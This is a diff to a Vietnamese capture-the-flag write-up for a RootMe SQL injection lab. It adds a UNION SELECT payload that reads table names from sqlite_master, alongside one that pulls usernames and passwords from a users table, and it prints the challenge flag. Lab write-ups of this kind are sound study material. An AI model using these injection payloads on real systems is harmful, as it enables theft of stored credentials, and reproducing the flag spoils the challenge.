@@ -15,7 +15,9 @@ Khi tôi thử đến ```' order by 3--``` thì báo lỗi => có 2 cột
 
 ![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/65b06731-5751-4299-9e4a-d83947cbde99)
 
-Sử dụng  ```a’ union select username,password FROM users--``` => flag là ```c4K04dtIaJsuWdi```
+Sử dụng ```a’union select 1,sql FROM sqlite_master;``` => thấy tên bảng, tên cột
+
+Sau đó chỉ cần ```a’ union select username,password FROM users--``` => flag là ```c4K04dtIaJsuWdi```
 
 :V đến đây rồi thì dễ thôi nhưng có vẻ như lab quá lâu rồi và có vấn đề nào đó khi truy vấn tới database nên nó sẽ báo lỗi thì phải 
 
